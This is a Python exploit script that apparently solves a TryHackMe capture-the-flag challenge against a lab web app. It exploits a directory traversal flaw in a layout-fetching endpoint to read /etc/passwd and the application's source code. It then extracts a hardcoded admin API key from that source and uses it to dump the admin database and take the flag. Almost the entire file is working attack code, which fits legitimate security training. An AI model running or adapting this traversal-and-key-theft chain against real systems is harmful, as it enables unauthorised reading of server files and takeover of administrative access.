import requests
import urllib3
import re


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
url="http://10.48.189.215:5000"

session=requests.session()

params={'username':'test1','password':'test1'}

register=session.post(url+"/register",data=params,verify=False,proxies=proxies)

directoryTraversalCheck=session.get(url+"/api/fetch_layout?layout=/etc/passwd",verify=False,proxies=proxies)

if directoryTraversalCheck.status_code==200:
    print("This parameter is vulnerable to directory Traversal ! and I have figured Out the source code file")
    sourceCodeFile=session.get(url+"/api/fetch_layout?layout=/opt/Valenfind/app.py",verify=False,proxies=proxies)
    if sourceCodeFile.status_code==200:
        matches = re.findall(r"@app\.route\(['\"](.*?)['\"]\)", sourceCodeFile.text)
        for idx, path in enumerate(matches):
            print(f"Path no {idx} is : {path}")
        
        print("\n\nHere We got a suspicious Directory where the flag might be, So Lets see the full function what it contains ! \n\n")
        
        start='''@app.route('/api/admin/export_db')'''
        end="return"
        pattern=re.escape(start)+r".*?"+re.escape(end)
        match=re.search(pattern,sourceCodeFile.text,re.DOTALL)
        if match:
            print(match.group(0))
            print("\n\n Wait what is ADMIN_API_KEY, lets search in the source code , it must be here somewhere ! \n\n")
            key=re.search(r'ADMIN_API_KEY\s*=\s*["\'](.*?)["\']', sourceCodeFile.text)
            adminApiKey=key.group(1)
            print(f"Admin Api Key : {adminApiKey}")
            header={'X-Valentine-Token':f'{adminApiKey}'}
            finalDatabaseFile=session.get(url+"/api/admin/export_db",headers=header,verify=False,proxies=proxies)
            start="THM"
            end="}"
            pattern=re.escape(start)+r".*?"+re.escape(end)
            flag=re.search(pattern,finalDatabaseFile.text)
            print(f"\n================================\n\n\nThe Final Flag is : {flag.group(0)}")
        


